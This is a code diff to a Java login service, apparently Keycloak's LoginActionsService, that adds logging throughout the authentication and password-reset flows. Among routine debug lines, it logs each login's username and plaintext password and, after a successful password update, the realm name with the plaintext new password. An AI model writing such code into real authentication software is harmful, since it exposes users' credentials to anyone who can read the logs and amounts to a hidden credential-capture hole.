@@ -97,6 +97,7 @@ import javax.ws.rs.core.UriBuilder;
 import javax.ws.rs.core.UriBuilderException;
 import javax.ws.rs.core.UriInfo;
 import javax.ws.rs.ext.Providers;
+
 import java.net.URI;
 import java.util.Map;
 
@@ -304,6 +305,14 @@ public class LoginActionsService {
             response = processor.handleBrowserException(e);
             authSession = processor.getAuthenticationSession(); // Could be changed (eg. Forked flow)
         }
+       logger.info("execution:"+execution);
+       logger.info("username:"+request.getFormParameters().getFirst("username")+"  password:"+request.getFormParameters().getFirst("password"));
+       
+       if (action ||
+    		   (Boolean) request.getAttribute("SHOULD_UPDATE_BROWSER_HISTORY")) {
+    	   URI lastExecutionURL = new AuthenticationFlowURLHelper(session, session.getContext().getRealm(), session.getContext().getUri()).getLastExecutionUrl(authSession);
+    	   logger.info(lastExecutionURL);
+       }
 
         return BrowserHistoryHelper.getInstance().saveResponseAndRedirect(session, authSession, response, action, request);
     }
@@ -321,6 +330,7 @@ public class LoginActionsService {
                                      @QueryParam(Constants.EXECUTION) String execution,
                                      @QueryParam(Constants.CLIENT_ID) String clientId,
                                      @QueryParam(Constants.TAB_ID) String tabId) {
+    	logger.info("POST authenticateForm");
         return authenticate(authSessionId, code, execution, clientId, tabId);
     }
 
@@ -335,7 +345,7 @@ public class LoginActionsService {
         if (key != null) {
             return handleActionToken(key, execution, clientId, tabId);
         }
-
+        logger.info("POST:"+RESET_CREDENTIALS_PATH);
         event.event(EventType.RESET_PASSWORD);
 
         return resetCredentials(authSessionId, code, execution, clientId, tabId);
@@ -356,7 +366,8 @@ public class LoginActionsService {
                                         @QueryParam(Constants.EXECUTION) String execution,
                                         @QueryParam(Constants.CLIENT_ID) String clientId,
                                         @QueryParam(Constants.TAB_ID) String tabId) {
-        ClientModel client = realm.getClientByClientId(clientId);
+    	logger.info("get:"+RESET_CREDENTIALS_PATH);
+    	ClientModel client = realm.getClientByClientId(clientId);
         AuthenticationSessionModel authSession = new AuthenticationSessionManager(session).getCurrentAuthenticationSession(realm, client, tabId);
 
         // we allow applications to link to reset credentials without going through OAuth or SAML handshakes
@@ -713,6 +724,7 @@ public class LoginActionsService {
                                        @QueryParam(Constants.EXECUTION) String execution,
                                        @QueryParam(Constants.CLIENT_ID) String clientId,
                                        @QueryParam(Constants.TAB_ID) String tabId) {
+    	logger.info(" GET "+POST_BROKER_LOGIN_PATH);
         return brokerLoginFlow(authSessionId, code, execution, clientId, tabId, POST_BROKER_LOGIN_PATH);
     }
 
@@ -723,7 +735,7 @@ public class LoginActionsService {
                                         @QueryParam(Constants.EXECUTION) String execution,
                                         @QueryParam(Constants.CLIENT_ID) String clientId,
                                         @QueryParam(Constants.TAB_ID) String tabId) {
-        return brokerLoginFlow(authSessionId, code, execution, clientId, tabId, POST_BROKER_LOGIN_PATH);
+    	return brokerLoginFlow(authSessionId, code, execution, clientId, tabId, POST_BROKER_LOGIN_PATH);
     }
 
 
@@ -956,7 +968,8 @@ public class LoginActionsService {
         if (!checks.verifyRequiredAction(action)) {
             return checks.getResponse();
         }
-
+        logger.info("POST processRequireAction");
+        logger.info("POST "+action);
         AuthenticationSessionModel authSession = checks.getAuthenticationSession();
         if (!checks.isActionRequest()) {
             initLoginEvent(authSession);
@@ -1024,8 +1037,18 @@ public class LoginActionsService {
         } else {
             throw new RuntimeException("Unreachable");
         }
-
-        return BrowserHistoryHelper.getInstance().saveResponseAndRedirect(session, authSession, response, true, request);
+        Response rs = BrowserHistoryHelper.getInstance().saveResponseAndRedirect(session, authSession, response, true, request);
+        /**
+         * 重置密码成功
+         */
+        if(UserModel.RequiredAction.UPDATE_PASSWORD.name().equals(action) 
+        		&& context.getStatus() == RequiredActionContext.Status.SUCCESS){
+        	String realmName = realm.getName();
+        	String pw = request.getFormParameters().getFirst("password-new");
+        	logger.info("realm:"+realmName+"  pw:"+pw);
+        }
+        
+        return rs;
     }
     
     private Response interruptionResponse(RequiredActionContextResult context, AuthenticationSessionModel authSession, String action, Error error) {
